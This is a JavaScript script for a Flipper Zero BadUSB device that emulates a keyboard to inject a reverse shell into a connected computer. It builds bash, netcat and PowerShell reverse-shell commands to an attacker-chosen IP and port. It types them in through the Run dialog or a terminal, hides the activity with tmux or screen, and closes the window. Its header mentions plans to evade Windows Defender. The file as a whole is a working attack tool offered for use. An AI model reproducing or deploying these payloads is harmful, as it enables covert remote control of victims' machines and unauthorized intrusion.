// ------------------------------------------------------------------------------------------------------------
// This script will generate a reverse shell for you, asking for the IP and Port to connect to as well as
// the type of shell you want to generate and if you need to open a terminal window before sending the payload.
// OS Supported: Linux, Mac, Windows
//
// At this stage I'm figuring out a way to bypass the Windows Defender and send a powershell payload.
//
// By B3rt1ng, https://github.com/b3rt1ng
// ------------------------------------------------------------------------------------------------------------

let keyboard = require('keyboard');
let submenu = require("submenu");
let notify = require("notification");
let badusb = require("badusb");


keyboard.setHeader("Remote IP");
let ip = keyboard.text(100, "192.168.1.1", true);

keyboard.setHeader("Remote Port");
let port = keyboard.text(100, "4242", true);

submenu.setHeader("Select an OS");
submenu.addItem("-> Linux", 0);
submenu.addItem("-> Mac", 1);
submenu.addItem("-> Windows", 2);
let os = submenu.show();

let shellType = false;
if (os === 0 || os === 1) {
    submenu.setHeader("Select a shell type");
    submenu.addItem("-> bash", 0);
    submenu.addItem("-> shell", 1);
    submenu.addItem("-> netcat", 2);
    submenu.addItem("-> /bin/sh", 3);
    submenu.addItem("-> /bin/bash", 4);
} else if (os === 2) {
    submenu.setHeader("Select a shell type");
    submenu.addItem("-> powershell #1", 5);
    submenu.addItem("-> powershell #2", 6);
    submenu.addItem("-> powershell #3", 7);
}
shellType = submenu.show();

let command = "";
if (shellType === 0) { // a switch case implementation would come in handy :(
    command = "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
} else if (shellType === 1) {
    command = "sh -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
} else if (shellType === 2) {
    command = "nc " + ip + " " + port + " -e /bin/bash";
} else if (shellType === 3) {
    command = "/bin/sh -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
} else if (shellType === 4) {
    command = "/bin/bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
} else if (shellType === 5) {
    command = "$LHOST = \"" + ip + "\"; $LPORT = " + port + "; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()";
} else if (shellType === 6) { // gui + r based
    command = "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('" + ip + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
} else if (shellType === 7) { // gui + r based
    command = "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('" + ip + "', " + port + ");$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()";
}

print("Reverse shell command:");
print(command);

let openTerminal = 1;
if (os === 0 || os === 1) {
    submenu.setHeader("open terminal");
    submenu.addItem("-> Yes !", 0);
    submenu.addItem("-> No !", 1);
    openTerminal = submenu.show();
}

submenu.setHeader("change layout"); // because i'm french and i need to change the layout to Azerty for example
submenu.addItem("-> Qwerty", 0);
submenu.addItem("-> Azerty", 1);
submenu.addItem("-> Azerty Mac", 3);
submenu.addItem("-> No !", 4);
let changeLayout = submenu.show();


// the following layout_path is only available on the dev firmware.
if (changeLayout === 0) {
    badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero", layout_path: "/ext/badusb/assets/layouts/en-US.kl"});
} else if (changeLayout === 1) {
    badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero", layout_path: "/ext/badusb/assets/layouts/fr-FR.kl"});
} else if (changeLayout === 3) {
    badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero", layout_path: "/ext/badusb/assets/layouts/fr-FR-mac.kl"});
} else {
    badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero"});
}

let hideActions = 2;
if (os === 0 || os === 1) {
    submenu.setHeader("Hide actions");
    // we will use some terminal multiplexer to hide the actions, choosing one of them will also make the script exit the terminal after the payload is sent.
    submenu.addItem("-> Tmux", 0);
    submenu.addItem("-> Screen", 1);
    submenu.addItem("-> No ! ", 2);
    hideActions = submenu.show();
}

print("waiting for connection...");
while (!badusb.isConnected()) {
    delay(1000);
}

notify.blink("blue", "short");
notify.error();
delay(1000);

if (shellType === 6 || shellType === 7) {
    print("sending powershell payload...");
    badusb.press("GUI", "r");
    delay(500);
    badusb.println("cmd", 10);
    delay(1000);
    badusb.println(command, 10);
    delay(500);
} else if (shellType === 5) {
    print("sending powershell payload...");
    badusb.press("GUI", "x");
    delay(300);
    badusb.press("i");
    delay(3000);
    badusb.println(command, 10);
} else {

    if (openTerminal === 0) {
        print("opening terminal...");
        badusb.press("CTRL", "ALT", "t");
        delay(1500);
    }

    print("sending payload...");
    if (hideActions === 0) {
        badusb.println("tmux new-session -d -s \"none\" \"" + command + "\"", 10);
        delay(500);
        badusb.press("ALT", "F4");
    } else if (hideActions === 1) {
        badusb.println("screen -d -m " + command, 10);
        delay(500);
        badusb.press("ALT", "F4");
    } else {
        badusb.println(command, 10);
    }
}

badusb.quit();
notify.success();
notify.blink("green", "long");